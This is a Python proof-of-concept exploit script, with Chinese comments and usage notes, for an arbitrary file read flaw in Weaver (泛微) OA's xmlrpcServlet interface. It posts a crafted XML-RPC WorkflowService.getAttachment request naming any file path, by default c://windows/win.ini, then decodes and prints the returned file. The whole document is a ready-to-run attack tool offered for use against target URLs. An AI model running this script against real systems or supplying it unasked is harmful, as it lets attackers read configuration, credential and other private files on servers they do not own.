###泛微OA xmlrpcServlet接口任意文件读取漏洞
###作者： summerainX
###项目地址：https://github.com/summerainX/vul_poc
###脚本使用方式 python3 ecology-xmlrpcservlet-readfile.py -u url -f file_path    
###如果不选择文件地址 则默认c://windows/win.ini


import requests
import xml.etree.ElementTree as ET
import base64
import argparse

def read_file(url,file_path):
    xml_data = f'<?xml version="1.0" encoding="UTF-8"?><methodCall><methodName>WorkflowService.getAttachment</methodName><params><param><value><string>{file_path}</string>\</value></param></params></methodCall>'
    try:
        response = requests.post(url+"/weaver/org.apache.xmlrpc.webserver.XmlRpcServlet",data = xml_data)
        if response.status_code ==200:
            base64_data = ET.fromstring(response.text).find('.//base64').text
            decoded_data = base64.b64decode(base64_data).decode('utf-8')
            print(f"读取的文件是：{file_path}/n")
            print(decoded_data)
        else:
            print("该网站不存在漏洞 或文件路径错误！")
    except:
        print("该网站不存在漏洞！")

if __name__=="__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', '--url', help='输入目标网站域名')
    parser.add_argument('-f', '--file', help='输入你想要读取的文件路径（绝对路径）',default='c://windows/win.ini')
    args = parser.parse_args()
    read_file(args.url, args.file)